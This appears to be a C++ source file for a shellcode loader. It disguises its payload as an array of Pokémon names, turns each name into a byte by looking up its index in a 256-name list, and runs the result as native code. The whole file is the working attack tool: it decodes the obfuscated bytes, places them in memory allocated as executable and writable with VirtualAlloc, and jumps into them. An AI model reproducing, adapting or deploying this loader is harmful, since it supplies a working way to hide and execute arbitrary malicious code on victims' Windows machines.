#include <iostream>
#include <string>
#include <Bits.h>
using namespace std;

// Created by: Techryptic
// @Tech

string indexNumberToHexa(int number);
void reverse_String(string& str, int last_index, int starting_index);
void printAscii(unsigned char* index_to_hexa_array, int counter_s);

int main()
{
    string poke_shellcode[] = { "Slowbro", "Farfetchd", "Magnemite", "Magneton", "Seel", "Dewgong", "Dodrio", "Porygon", "Houndoom", "Lapras", "Tyrogue", "Arbok", "Venomoth", "Larvitar", "Seel", "Hitmonlee", "Kingler", "Exeggcute", "Cubone", "Staryu", "Electrode", "Cubone", "Dewgong", "Marowak", "Weezing", "Bellsprout", "Porygon", "Electrode", "Treecko", "Venomoth", "Larvitar", "Voltorb", "Omastar", "Gengar", "Venonat", "Omastar", "Cloyster", "Butterfree", "Omastar", "Cloyster", "Raticate", "Omastar", "Sandshrew", "Omastar", "Sandshrew", "Omastar", "Cloyster", "Pidgey", "Porygon", "Haunter", "Tyranitar", "Venomoth", "Sunflora", "Omastar", "Machoke", "Poliwag", "Bulbasaur", "Teddiursa", "Omastar", "Kadabra", "Staryu", "Bulbasaur", "Teddiursa", "Omastar", "Tentacool", "Clefable", "Bulbasaur", "Ursaring", "Porygon", "Ponyta", "Entei", "Omastar", "Staryu", "NidoranM", "Bulbasaur", "Remoraid", "Porygon", "Electabuzz", "Magby", "Omastar", "Slowbro", "Sandslash", "Bulbasaur", "Slugma", "Porygon", "Dodrio", "Tyrogue", "Omastar", "Grimer", "Raticate", "Venomoth", "Sunflora", "Omastar", "Dodrio", "Tyranitar", "Omastar", "Electabuzz", "Magby", "Omastar", "Seadra", "Treecko", "Venomoth", "Unown", "Treecko", "Omastar", "Poliwag", "Jolteon", "Bulbasaur", "Sneasel", "Exeggcute", "Lapras", "Yanma", "Wartortle", "Raikou", "Ledian", "Horsea", "Caterpie", "Kadabra", "Primeape", "Teddiursa", "Tangela", "Houndoom", "Lapras", "Espeon", "Ninetales", "Smeargle", "Alakazam", "Omastar", "Ponyta", "Entei", "Porygon", "Qwilfish", "Omastar", "Dodrio", "Tyrogue", "Exeggcute", "Omastar", "Charmander", "Alakazam", "Omastar", "Charmander", "Gyarados", "Bulbasaur", "Teddiursa", "Venomoth", "Granbull", "Magneton", "Cubone", "Paras", "Electrode", "Staryu", "Electrode", "Cubone", "Kingler", "Hypno", "Lickitung", "Kingler", "Cubone", "Koffing", "Dugtrio", "Diglett", "Gastly", "Cubone", "Starmie", "Kangaskhan", "Horsea", "Electrode", "Cubone", "Seaking", "Kangaskhan", "Gastly", "Farfetchd", "Cubone", "Marowak", "Weezing", "Voltorb", "Rhyhorn", "Cubone", "Machoke", "Growlithe", "Gastly", "Dewgong", "Porygon", "Kingdra", "Hitmonlee", "Caterpie", "Seel", "Torchic", "Steelix", "Lapras", "Espeon", "Weepinbell", "Haunter", "Onix", "Gengar", "Shellder", "Muk", "Cloyster", "Grimer", "Quagsire" };

    /// Do not edit below
    string pokemon[256] = { "Missingno", "Bulbasaur", "Ivysaur", "Venusaur", "Charmander", "Charmeleon", "Charizard", "Squirtle", "Wartortle", "Blastoise", "Caterpie", "Metapod", "Butterfree", "Weedle", "Kakuna", "Beedrill", "Pidgey", "Pidgeotto", "Pidgeot", "Rattata", "Raticate", "Spearow", "Fearow", "Ekans", "Arbok", "Pikachu", "Raichu", "Sandshrew", "Sandslash", "NidoranF", "Nidorina", "Nidoqueen", "NidoranM", "Nidorino", "Nidoking", "Clefairy", "Clefable", "Vulpix", "Ninetales", "Jigglypuff", "Wigglytuff", "Zubat", "Golbat", "Oddish", "Gloom", "Vileplume", "Paras", "Parasect", "Venonat", "Venomoth", "Diglett", "Dugtrio", "Meowth", "Persian", "Psyduck", "Golduck", "Mankey", "Primeape", "Growlithe", "Arcanine", "Poliwag", "Poliwhirl", "Poliwrath", "Abra", "Kadabra", "Alakazam", "Machop", "Machoke", "Machamp", "Bellsprout", "Weepinbell", "Victreebel", "Tentacool", "Tentacruel", "Geodude", "Graveler", "Golem", "Ponyta", "Rapidash", "Slowpoke", "Slowbro", "Magnemite", "Magneton", "Farfetchd", "Doduo", "Dodrio", "Seel", "Dewgong", "Grimer", "Muk", "Shellder", "Cloyster", "Gastly", "Haunter", "Gengar", "Onix", "Drowzee", "Hypno", "Krabby", "Kingler", "Voltorb", "Electrode", "Exeggcute", "Exeggutor", "Cubone", "Marowak", "Hitmonlee", "Hitmonchan", "Lickitung", "Koffing", "Weezing", "Rhyhorn", "Rhydon", "Chansey", "Tangela", "Kangaskhan", "Horsea", "Seadra", "Goldeen", "Seaking", "Staryu", "Starmie", "Mr. Mime", "Scyther", "Jynx", "Electabuzz", "Magmar", "Pinsir", "Tauros", "Magikarp", "Gyarados", "Lapras", "Ditto", "Eevee", "Vaporeon", "Jolteon", "Flareon", "Porygon", "Omanyte", "Omastar", "Kabuto", "Kabutops", "Aerodactyl", "Snorlax", "Articuno", "Zapdos", "Moltres", "Dratini", "Dragonair", "Dragonite", "Mewtwo", "Mew", "Chikorita", "Bayleef", "Meganium", "Cyndaquil", "Quilava", "Typhlosion", "Totodile", "Croconaw", "Feraligatr", "Sentret", "Furret", "Hoothoot", "Noctowl", "Ledyba", "Ledian", "Spinarak", "Ariados", "Crobat", "Chinchou", "Lanturn", "Pichu", "Cleffa", "Igglybuff", "Togepi", "Togetic", "Natu", "Xatu", "Mareep", "Flaaffy", "Ampharos", "Bellossom", "Marill", "Azumarill", "Sudowoodo", "Politoed", "Hoppip", "Skiploom", "Jumpluff", "Aipom", "Sunkern", "Sunflora", "Yanma", "Wooper", "Quagsire", "Espeon", "Umbreon", "Murkrow", "Slowking", "Misdreavus", "Unown", "Wobbuffet", "Girafarig", "Pineco", "Forretress", "Dunsparce", "Gligar", "Steelix", "Snubbull", "Granbull", "Qwilfish", "Scizor", "Shuckle", "Heracross", "Sneasel", "Teddiursa", "Ursaring", "Slugma", "Magcargo", "Swinub", "Piloswine", "Corsola", "Remoraid", "Octillery", "Delibird", "Mantine", "Skarmory", "Houndour", "Houndoom", "Kingdra", "Phanpy", "Donphan", "Porygon2", "Stantler", "Smeargle", "Tyrogue", "Hitmontop", "Smoochum", "Elekid", "Magby", "Miltank", "Blissey", "Raikou", "Entei", "Suicune", "Larvitar", "Pupitar", "Tyranitar", "Lugia", "Ho-Oh", "Celebi", "Treecko", "Grovyle", "Sceptile", "Torchic" };

    int size1 = sizeof(pokemon) / sizeof(pokemon[0]);
    int size2 = sizeof(poke_shellcode) / sizeof(poke_shellcode[0]);
    //creating a dynamic array for holding indexes having size=siez of poke_shellcode considering the
    //assumtion that all poke_shellcode elements exist in pokemon
    int* index = new int[size2];
    int index_counter = 0;
    for (int i = 0; i < size2; i++) {                           //reading poke_shellcode element one by one
        for (int j = 0; j < size1; j++) {                       //reading pokemon element one by one
            if (poke_shellcode[i].compare(pokemon[j]) == 0) {   //both strings are equal
                index[index_counter] = j;                       //saving index
                index_counter++;
                break;                                          //stoping inner loop
            }
        }
    }
    //for storing hex values of indexes
    unsigned char* index_to_hexa_array = new unsigned char[index_counter * 5];
    int counter_s = 0;
    for (int i = 0; i < index_counter; i++) {
        string value = "";
        value += "\\x";
        if (index[i] < 10) {
            value += "0";
        }
        value += indexNumberToHexa(index[i]);  //converting each index to hexa and inserting in array
        for (int k = 0; k < (int)value.length(); k++) {
            index_to_hexa_array[counter_s] = value[k];
            counter_s++;
        }
    }
    std::string payload;
    index_to_hexa_array[counter_s] = '\0';
    printAscii(index_to_hexa_array, counter_s);

    delete[]index; //freeing memory
    delete[]index_to_hexa_array;
    index = nullptr;  //reseting the index pointer
    index_to_hexa_array = nullptr;
    return 0;
}

void reverse_String(string& str, int last_index, int starting_index) {
    if (last_index <= starting_index) { return; }
    swap(str[starting_index], str[last_index]);
    reverse_String(str, last_index - 1, starting_index + 1);
}
string indexNumberToHexa(int number) {
    string hexavalue = "";
    while (number != 0) {
        int remainder = number % 16;
        if (remainder < 10) {   //number 0-9
            hexavalue += remainder + 48;
        }
        else {//alphabet A-F
            hexavalue += remainder + 55; //converting number to alphabet
        }
        number = number / 16;
    }
    reverse_String(hexavalue, hexavalue.length() - 1, 0);
    return (hexavalue != "" ? hexavalue : "0");
}
void printAscii(unsigned char* index_to_hexa_array, int counter_s) {
    string sc;
    for (int i = 2; i < counter_s; i++) {
        if (index_to_hexa_array[i] != '\\' && index_to_hexa_array[i] != 'x') {//hex value cannot be more than 2 characters
            string vt; // hex ex: 01
            vt.push_back(index_to_hexa_array[i]);
            vt.push_back(index_to_hexa_array[i + 1]);
            //cout << (char)stoul(vt, nullptr, 16);
            unsigned char n = (char)stoul(vt, nullptr, 16);
            sc += n;
            i++;
        }
    }
    sc += '\0'; // adding nullbyte to string to mimic array
    //std::cout << "The size is " << sc.size() << " bytes.\n";
    DWORD oldprotect = 0;
    void* exec = VirtualAlloc(0, sc.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, sc.c_str(), sc.size());
    ((void(*)())exec)();
}
